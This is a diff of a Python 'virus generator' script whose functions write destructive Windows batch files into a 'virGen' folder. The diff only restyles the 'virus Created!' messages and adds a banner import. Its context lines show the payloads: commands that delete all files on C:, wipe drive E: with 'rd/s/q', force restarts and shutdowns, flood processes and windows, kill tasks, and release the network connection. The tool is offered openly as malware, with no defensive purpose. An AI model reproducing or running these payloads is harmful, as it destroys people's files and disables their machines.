@@ -1,5 +1,5 @@
 import os, time
-
+from conf.banner import *
 
 def overload():
 	o = open('overload.bat','a')
@@ -12,8 +12,8 @@ def overload():
 		goto hewo
 
 		""")
-	print("virus Created!")
-	print("done! File is in virGen Folder!")
+	print(r+"\n virus Created!")
+	print(r+"done! File is in virGen Folder!\n")
 
 
 
@@ -25,8 +25,8 @@ def deletefiles():
 		del*.*
 
 		""")
-	print("virus Created!")
-	print("done! File is in virGen Folder!")
+	print(r+"\n virus Created!")
+	print(r+"done! File is in virGen Folder!\n")
 
 
 def bsof():
@@ -37,8 +37,8 @@ def bsof():
 		shutdown -r -f -t 00
 
 		""")
-	print("virus Created!")
-	print("done! File is in virGen Folder!")
+	print(r+"\n virus Created!")
+	print(r+"done! File is in virGen Folder!\n")
 
 
 
@@ -52,8 +52,8 @@ def foolkey():
 		loop 
 
 		""")
-	print("virus Created!")
-	print("done! File is in virGen Folder!")
+	print(r+"\n virus Created!")
+	print(r+"done! File is in virGen Folder!\n")
 
 
 def formatdrive():
@@ -64,8 +64,8 @@ def formatdrive():
 		rd/s/q E:
 
 		""")
-	print("virus Created!")
-	print("done! File is in virGen Folder!")
+	print(r+"\n virus Created!")
+	print(r+"done! File is in virGen Folder!\n")
 
 
 
@@ -88,8 +88,8 @@ def shutdown():
 		Shutdown -s -t 7 -c "VIRUS IS SPREADING! c:Drive
 
 		""")
-	print("virus Created!")
-	print("done! File is in virGen Folder!")
+	print(r+"\n virus Created!")
+	print(r+"done! File is in virGen Folder!\n")
 
 
 def userflood():
@@ -101,8 +101,8 @@ def userflood():
 		goto x
 
 		""")
-	print("virus Created!")
-	print("done! File is in virGen Folder!")
+	print(r+"\n virus Created!")
+	print(r+"done! File is in virGen Folder!\n")
 
 
 def delos():
@@ -112,8 +112,8 @@ def delos():
 		del C:*.*|y
 
 		""")
-	print("virus Created!")
-	print("done! File is in virGen Folder!")
+	print(r+"\n virus Created!")
+	print(r+"done! File is in virGen Folder!\n")
 
 
 def infnotepads():
@@ -126,8 +126,8 @@ def infnotepads():
 		goto ninja
 
 		""")
-	print("virus Created!")
-	print("done! File is in virGen Folder!")
+	print(r+"\n virus Created!")
+	print(r+"done! File is in virGen Folder!\n")
 
 
 def Bomb():
@@ -138,8 +138,8 @@ def Bomb():
 		exit
 
 		""")
-	print("virus Created!")
-	print("done! File is in virGen Folder!")
+	print(r+"\n virus Created!")
+	print(r+"done! File is in virGen Folder!\n")
 
 
 def taskill():
@@ -159,8 +159,8 @@ def taskill():
 		pause
 
 		""")
-	print("virus Created!")
-	print("done! File is in virGen Folder!")
+	print(r+"\n virus Created!")
+	print(r+"done! File is in virGen Folder!\n")
 
 def netgone():
 	o = open('netcut.bat','a')
@@ -169,5 +169,5 @@ def netgone():
 		ifconfig /release
 		shutdown /s
 		""")
-	print("virus Created!")
-	print("done! File is in virGen Folder!")
+	print(r+"\n virus Created!")
+	print(r+"done! File is in virGen Folder!\n")
